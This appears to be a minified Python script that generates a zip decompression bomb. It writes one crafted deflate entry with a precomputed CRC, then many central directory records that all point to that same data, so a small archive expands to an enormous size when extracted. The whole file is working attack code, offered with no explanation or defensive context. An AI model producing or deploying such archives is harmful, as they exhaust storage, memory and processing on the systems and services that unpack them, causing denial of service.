# warning: minified
from struct import pack as H
def D(m,v,A=0):
	for B in range(len(m)):
		if v>>B&1:A^=m[B]
	return A
def make_zip(f,num_files,compressed_size):
	O,J,Y,M=(1<<32)-1,num_files,compressed_size,[1<<A for A in range(33)];B,C=1033+Y*1032,[1996959894,3993919788,124634137,249268274,498536548,997073096,1994146192,3988292384]+[1<<A for A in range(24)]+[O+1];Z=B
	while B:
		if B&1:M=[D(M,A)for A in C]
		C=[D(C,A)for A in C];B>>=1
	a=D(M,2*O+1)&O^O;E=f.write(H('<LHHHHHLLLHH',67324752,20,0,8,0,0,a,15+Y,Z,1,0)+b'0\xed\xc0\x81\x08\0\0\0\xc0\xb0\xfbS_d\x0b'+b'\0'*Y+b'`');b=E
	for G in range(J):
		O=[]
		while True:
			O.insert(0,b'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'[G%36]);G=G//36-1
			if G<0:break
		N=bytes(O);E+=f.write(H('<LHHHHHHLLLHHHHHLL',33639248,20,20,0,8,0,0,a,15+Y,Z,len(N),0,0,0,0,0,0)+N)
	f.write(H('<LHHHHLLH',101010256,0,0,J,J,E-b,b,0))
